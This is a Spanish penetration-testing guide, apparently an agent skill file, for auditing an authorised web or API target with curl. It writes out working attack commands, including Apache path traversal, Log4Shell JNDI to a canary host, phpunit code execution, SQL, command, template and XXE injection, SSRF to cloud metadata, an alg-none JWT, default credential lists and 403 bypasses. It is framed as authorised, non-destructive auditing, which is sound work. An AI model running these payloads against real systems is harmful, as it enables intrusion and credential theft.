# Auditoría Web Activa con curl

Auditoría funcional de un target web/API **autorizado** usando `curl` y herramientas CLI.
Cubre: análisis de versiones → búsqueda de CVEs → verificación de explotabilidad → rutas
sensibles → secretos → rate-limit → credenciales débiles → bypass de acceso → inyecciones → reporte.

## 0. Reglas de operación (léelas primero)

1. **Autorización:** solo targets con autorización por escrito. Sin excepción.
2. **No destructivo:** los payloads de esta guía leen, miden tiempos o verifican reflejo;
   no modifican datos. No subas archivos, no borres, y para RCE usa solo comandos de
   lectura (`id`, `whoami`) o verificación fuera de banda (canary), nunca acciones con efecto.
3. **Sin DoS:** no lances ráfagas masivas; respeta los limitadores (429/403) y párate si bloquean.
4. **Evidencia:** guarda cada respuesta relevante en `$BASE/evidence/` (`-D` headers, `-o` body).
5. **Severidad honesta:** si no se confirma explotabilidad, bájala a Info/Low.

## 1. Análisis de versiones (fingerprint)

### 1.1 Headers
```bash
curl -sI -L --max-time 10 <url>
```
Mira `Server`, `X-Powered-By`, `X-AspNet-Version`, `X-Generator`, `Via`, `X-Runtime` (Rails),
`X-Pingback`, y el nombre de cookie (`JSESSIONID`=Java, `PHPSESSID`=PHP,
`ASP.NET_SessionId`=ASP.NET, `connect.sid`=Node/Express).

### 1.2 Body
```bash
curl -sL --max-time 10 <url> | grep -ioE 'wp-content|generator[^>]*|joomla|drupal|laravel|django|flask|express|next|nuxt|react|vue|angular|asp\.net|spring|rails'
```

### 1.3 Endpoints que revelan versión
| Endpoint | Tecnología |
|---|---|
| `/wp-json/`, `/wp-login.php` | WordPress |
| `/administrator/` | Joomla |
| `/CHANGELOG.txt` | Drupal |
| `/README.md`, `/package.json` | Node.js |
| `/composer.json` | PHP |
| `/VERSION`, `/version.txt` | genérico |
| `/actuator/env`, `/actuator/info` | Spring Boot |
| `/swagger-ui.html`, `/openapi.json`, `/api-docs` | API REST |
| `/graphql` | GraphQL (POST `{"query":"{__typename}"}`) |
| `/info.php`, `/phpinfo.php` | PHP |
| `/server-status` | Apache (mod_status expuesto) |
| `/manager/html` | Tomcat |
| `/status` | nginx |

### 1.4 Assets estáticos
```bash
# Versión de plugin de WordPress
curl -s <url>/wp-content/plugins/<plugin>/readme.txt | grep -i "stable tag"
# Meta generator
curl -sL <url> | grep -ioE '<meta name="generator"[^>]*>'
# Versión en assets cacheados (?v=)
curl -sL <url> | grep -oE '(src|href)="[^"]*\?v=[0-9.]+"'
```

### 1.5 Ejecución
```bash
chmod +x scripts/*.sh
./scripts/fingerprint-scan.sh <url>     # desde la raiz de esta skill, en Kali
```
Resultado esperado: lista `software → versión` con la que buscar CVEs (fase 2).

## 2. Búsqueda de vulnerabilidades conocidas

Con `software + versión` concreto:

```bash
# NVD API (sin API key: ~5 req/30s; añade -H "apiKey: <key>" si tienes)
curl -s --max-time 30 "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=apache+2.4.49"
# Local con jq (legible: CVE, CVSS, severidad, descripción)
./scripts/cve-lookup.sh "apache http server" "2.4.49"
# MITRE CVE
curl -s "https://cveawg.mitre.org/api/cve/CVE-2021-41773"
# CISA KEV — vulns con explotación activa real (prioridad máxima)
curl -s "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json" | jq '.vulnerabilities[] | select(.vendorProject|test("apache";"i")) | .cveID'
# Exploit-DB local
searchsploit apache 2.4.49
```

Fuentes: NVD, MITRE, CISA KEV, GitHub Advisory DB, Exploit-DB, Vulners.
Prioriza KEV y CVSS ≥ 9.0 con PoC público + endpoint expuesto → High/Critical.
CVSS alto solo con config no estándar → Medium.

## 3. Verificación de explotabilidad (CVEs conocidos)

Solo en targets autorizados. Señal de éxito = respuesta distinta al baseline
(código, longitud, timing, reflejo del payload o callback al canary).
Usa canary propio (interactsh, dominio propio) para vulns que exfiltran; nunca datos reales.

| CVE / vuln | Producto vulnerable | Check con curl | Señal |
|---|---|---|---|
| CVE-2021-41773 / 42013 | Apache HTTPD 2.4.49 / 2.4.50 | `curl --path-as-is "http://host/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd"` | `root:` en respuesta |
| CVE-2021-44228 (Log4Shell) | Log4j < 2.15 | `curl -s -H 'X-Api-Version: ${jndi:ldap://<canary>}' <url>` | callback al canary |
| CVE-2017-1000486 | phpunit eval-stdin | `curl -s -X POST --data '<?php echo "pwned"; ?>' <url>/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php` | `pwned` en respuesta |
| LFI + Log Poisoning | PHP + logs accesibles | payload en User-Agent + `curl -s "<url>/page.php?file=/var/log/apache2/access.log"` | payload en respuesta |
| CVE-2022-26134 | Confluence | `curl -s "<url>/<context>/login.action?os_username=x&os_password=y&os_destination=http://<canary>"` | callback / 302 |
| CVE-2022-22965 (Spring4Shell) | Spring MVC (JDK9+, WAR) | adapta PoC público del framework detectado; verifica primero versión | 200 anómalo / cambio de estado (solo con autorización expresa) |
| CVE-2014-0160 (Heartbleed) | OpenSSL 1.0.1 | `nmap --script ssl-heartbleed -p 443 <host>` | positivo del scanner |

**Reglas:**
- Prefiere canary OOB sobre efectos visibles.
- Si la vuln permite RCE, demuéstrala con `id` / `whoami` (no destructivo) o detente en el canary.
- Sin confirmación → reporta teórico (Low/Info) con la versión como evidencia.

## 4. Verificación de rutas sensibles

Lista completa en `scripts/paths/common-sensitive-paths.txt` (sin slash inicial, una por línea).

```bash
./scripts/route-scan.sh <url>        # imprime rutas con status != 404/403 y contenido > 0
```

Interpretación:
- `200` JSON/JSON o texto con tamaño > 0 → revisar contenido.
- `301/302` a login o página de auth → el endpoint existe (puede filtrar por headers).
- `403` → existe pero bloqueado: pásalo a la fase de bypass (8).
- `404` uniforme (misma página de error custom) → no existe.

Categorías incluidas:
1. **VCS:** `.git/HEAD`, `.git/config`, `.svn/entries`, `.hg/store`
2. **Config/env:** `.env`, `.env.local`, `config.php`, `configuration.php`, `wp-config.php.bak`, `web.config`, `app.config`, `application.yml`, `settings.py`
3. **Backups:** `backup`, `backups`, `db.sql`, `dump.sql`, `www.zip`, `*.bak`, `*.old`
4. **Paneles:** `admin`, `administrator`, `manager/html`, `console`, `jenkins`, `grafana`, `kibana`, `phpmyadmin`, `adminer.php`
5. **API docs:** `swagger-ui.html`, `openapi.json`, `api-docs`, `graphql`
6. **Spring Actuator:** `actuator`, `actuator/env`, `actuator/heapdump`, `actuator/mappings`, `actuator/health`
7. **Metadata cloud (vía SSRF):** `latest/meta-data/`, `latest/user-data`
8. **Info:** `robots.txt`, `sitemap.xml`, `.well-known/security.txt`, `README.md`, `CHANGELOG`

## 5. Búsqueda de claves y secretos

### 5.1 Respuestas y HTML
```bash
curl -sL <url> | grep -ioE '(api[_-]?key|secret|password|token|bearer|client_id|client_secret|authorization)[^,<]{0,80}' | head -50
```

### 5.2 JavaScript
```bash
curl -sL <url> | grep -oE 'src="[^"]+\.js[^"]*"' | cut -d'"' -f2 | while read js; do
  curl -s "$js" | grep -ioE '(api[_-]?key|secret|token|password)[^,;}]{0,80}'
  curl -s "$js" | grep -oE 'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'  # JWTs
done
```

### 5.3 Patrones de secretos (grep -E)
| Proveedor | Patrón |
|---|---|
| AWS | `AKIA[0-9A-Z]{16}` |
| Google | `AIza[0-9A-Za-z_-]{35}` |
| GitHub | `ghp_[0-9A-Za-z]{36}` |
| Slack | `xox[abprs]-[0-9A-Za-z-]{10,}` |
| Stripe | `sk_live_[0-9a-zA-Z]{24,}` |
| JWT | `eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+` |
| Claves privadas | `-----BEGIN (RSA|EC|OPENSSH)? PRIVATE KEY-----` |
| Azure | `AccountKey=[a-zA-Z0-9+/=]{80,}` |

### 5.4 .git expuesto
```bash
curl -s <url>/.git/config                                # 200 → repo filtrado
git clone <url>/.git repo_clonado && cd repo_clonado
git log -p | grep -iE 'password|secret|api[_-]?key|token'
```

### 5.5 Endpoints que suelen devolver config
`/api/config`, `/api/settings`, `/api/keys`, `/config.js`, `/config.json`, `/env.js`, `/api/version`.

## 6. Verificación de rate limit

### 6.1 Endpoint público
```bash
# baseline
curl -s -o /dev/null -w "baseline: %{http_code} en %{time_total}s\n" <url>
# ráfaga controlada (20 requests)
for i in $(seq 1 20); do curl -s -o /dev/null -w "%{http_code}\n" <url>; done | sort | uniq -c
# headers de limitación
curl -sI <url> | grep -iE 'ratelimit|retry-after|429'
```
`429` / `Retry-After` → hay rate limit. Sin esos y sin degradación → pasa a 6.2.

### 6.2 Login (pocos intentos)
```bash
for i in $(seq 1 5); do curl -s -o /dev/null -w "%{http_code}\n" -X POST \
  --data-urlencode "user=admin" --data-urlencode "pass=wrong$i" <url>/login; done
```

### 6.3 Bypasses (solo verificar, no explotar a lo grande)
| Técnica | Detalle |
|---|---|
| Rotación IP falsa | `-H "X-Forwarded-For: 1.2.3.4"`, `X-Real-IP`, `X-Originating-IP`, `X-Remote-IP`, `Client-IP` |
| Rotación User-Agent | `-A` distinto por request |
| Confusión de caso | `X-Forwarded-for:` (minúscula) vs `X-Forwarded-For:` |
| Cambio de frontera | renovar cookie (`Set-Cookie`), variar `Origin`/`Referer` |

**Reporte:** login sin rate limit ni lockout → High (fuerza bruta). API sin límite → Medium.
Bypass funcional → High.

## 7. Verificación de credenciales débiles

Máximo 5–10 intentos por cuenta y solo si el panel está en scope. Nada de diccionarios masivos.

```bash
# WordPress
curl -s -o /dev/null -w "%{http_code}\n" -X POST --data-urlencode "log=admin" --data-urlencode "pwd=admin" <url>/wp-login.php
curl -s -o /dev/null -w "%{http_code}\n" -X POST --data-urlencode "log=admin" --data-urlencode "pwd=password" <url>/wp-login.php
```

| Producto | Defaults a probar |
|---|---|
| WordPress / CMS genérico | admin/admin, admin/password, admin/123456, admin/admin123 |
| Tomcat | tomcat/tomcat, admin/admin, manager/manager |
| Jenkins / Grafana | admin/(vacío), admin/admin |
| phpMyAdmin | root/(vacío), root/root, root/password |
| RabbitMQ | guest/guest |
| Routers/appliances (si en scope) | admin/admin, admin/(vacío), root/1234, admin/password |

**Enum de usuarios** (2 requests):
```bash
curl -s -o /dev/null -w "%{time_total} %{http_code}\n" -X POST --data-urlencode "user=admin" --data-urlencode "pass=x" <url>/login
curl -s -o /dev/null -w "%{time_total} %{http_code}\n" -X POST --data-urlencode "user=usuario_inexistente" --data-urlencode "pass=x" <url>/login
```
Tiempo, longitud o mensaje distinto → enumeración de usuarios (Medium).

## 8. Verificación de bypass de acceso

### 8.1 Bypass de 401/403 por ruta
```bash
for p in "/admin/" "//admin" "/./admin" "/admin%2f" "/%61dmin" "/ADMIN" "/admin;" "/admin/..;/admin/" "/admin?x=1" "/admin%00" "/admin#"; do
  printf "%-22s " "$p"; curl --path-as-is -s -o /dev/null -w "%{http_code}\n" "http://host$p"
done
```
Variantes: trailing slash, doble slash, punto, `..;`, doble encoding (`%252e%252e%252f`),
case, semicolon, `%00`, query, fragmento.

### 8.2 Bypass por headers (front-proxy / WAF)
```bash
curl -s -H "X-Original-URL: /admin" <url>/            # nginx/apache
curl -s -H "X-Rewrite-URL: /admin" <url>/             # IIS
curl -s -H "X-Custom-IP-Authorization: 127.0.0.1" <url>/admin
curl -s -H "X-Forwarded-For: 127.0.0.1" <url>/admin
```

### 8.3 Bypass por método HTTP
```bash
curl -s -X GET  <url>/ruta_restrictiva
curl -s -X POST <url>/ruta_restrictiva
curl -s -X PUT/PATCH/DELETE <url>/ruta_restrictiva
curl -s -H "X-HTTP-Method-Override: GET" -X POST <url>/ruta_restrictiva
```

### 8.4 JWT
```bash
echo "<jwt>" | cut -d. -f2 | base64 -d 2>/dev/null        # decodificar payload
curl -s -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.<payload>." <url>/recurso
```
Prueba también confusión RS256→HS256 (firmar con la clave pública) si el server acepta `alg: HS256`.

### 8.5 IDOR/BOLA y versionado de API
```bash
curl -s <url>/api/usuarios/1
curl -s <url>/api/usuarios/2          # ID secuencial (horizontal)
curl -s <url>/api/v1/config; /api/v2/config; /api/config
curl -s <url>/api/users/1/avatars     # recursos paralelos
```

Reporta bypass confirmado con antes/después (403 → 200) como evidencia.

## 9. Inyecciones con curl

Usa `--data-urlencode` para que curl codifique el payload. Compara contra baseline
(tamaño, código, timing). Todos los payloads aquí son de detección, no destructivos.

### 9.1 SQLi (paramétrico)
```bash
curl -s -o /dev/null -w "%{size_download} %{time_total}\n" "<url>/items?id=1"          # baseline
curl -s --data-urlencode "id=1' OR '1'='1" "<url>/items"     # booleana verdadera
curl -s --data-urlencode "id=1' AND '1'='2" "<url>/items"     # booleana falsa
curl -s --max-time 15 --data-urlencode "id=1' AND SLEEP(5)-- -" "<url>/items"   # time-based
curl -s --data-urlencode "id=1 UNION SELECT NULL,NULL,NULL-- -" "<url>/items"    # unión
```
Diferencia de tamaño entre `'1'='1` y `'1'='2` → SQLi booleana. SLEEP ≥ 5s → SQLi ciega.

### 9.2 Command injection (parámetros que llegan a shell: ping, search, traceroute)
```bash
curl -s --data-urlencode "host=127.0.0.1; id" "<url>/ping"
curl -s --data-urlencode "host=127.0.0.1|id" "<url>/ping"
curl -s --data-urlencode "host=\`id\`" "<url>/ping"
```
`uid=` en la respuesta → RCE.

### 9.3 SSTI
```bash
curl -s --data-urlencode "nombre={{7*7}}" "<url>/saludo"
curl -s --data-urlencode "nombre=\${7*7}" "<url>/saludo"
curl -s --data-urlencode "nombre=<%= 7*7 %>" "<url>/saludo"
curl -s --data-urlencode "nombre=#{7*7}" "<url>/saludo"
```
`49` reflejado → SSTI.

### 9.4 XSS (solo verificar reflejo)
```bash
curl -s --data-urlencode "q=<script>alert(1)</script>" "<url>/search" | grep -c "alert(1)"
curl -s --data-urlencode "q=<img src=x onerror=alert(1)>" "<url>/search" | grep -c "alert(1)"
```

### 9.5 XXE (endpoint XML)
```bash
curl -s -X POST -H "Content-Type: application/xml" \
  --data '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>' \
  <url>/api/xml
```

### 9.6 NoSQL (Mongo)
```bash
curl -s --data-urlencode "id[\$ne]=x" <url>/api/items
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"user":{"$gt":""},"pass":{"$gt":""}}' <url>/api/login
```

### 9.7 SSRF (parámetros URL)
```bash
curl -s --data-urlencode "url=http://169.254.169.254/latest/meta-data/" "<url>/fetch"
# variantes de bypass de bloqueos: 0177.0.0.1, 2130706433, [::ffff:127.0.0.1]
```
Metadata IAM devuelta → SSRF High.

## 10. Reporte

Cada hallazgo en `$BASE/report/report.md`: título, severidad (Critical/High/Medium/Low/Info),
URL + método, evidencia (comando y respuesta), reproducción, recomendación y mapeo OWASP.

```markdown
## [High] Tiempo de respuesta revela usuario existente en /login
- **URL:** POST http://host/login
- **Evidencia:** `curl -s -X POST --data "user=juan&pass=x" -w "%{time_total}"` → 1.2s; inexistente → 0.3s
- **Reproducción:** ver evidencia.
- **OWASP:** A07 (Identification and Authentication Failures)
- **Recomendación:** respuestas y tiempos uniformes + rate limit + lockout.
```

Veredicto rápido al cierre:

| Check | Hallazgo típico | Severidad base |
|---|---|---|
| Versión vulnerable + PoC público | Componente obsoleto | High (Critical si RCE) |
| CVE confirmado | Explotación | Critical/High |
| `.env` / `.git` / backup accesible | Exposición de datos | High |
| Secreto filtrado | Fuga de credenciales | Critical/High |
| Login sin rate limit / lockout | Fuerza bruta | High |
| Credencial default válida | Acceso directo | Critical |
| 403 → 200 por variante | Broken Access Control | High |
| SQLi/XSS/SSTI/RCE confirmado | Inyección | High (Critical si RCE) |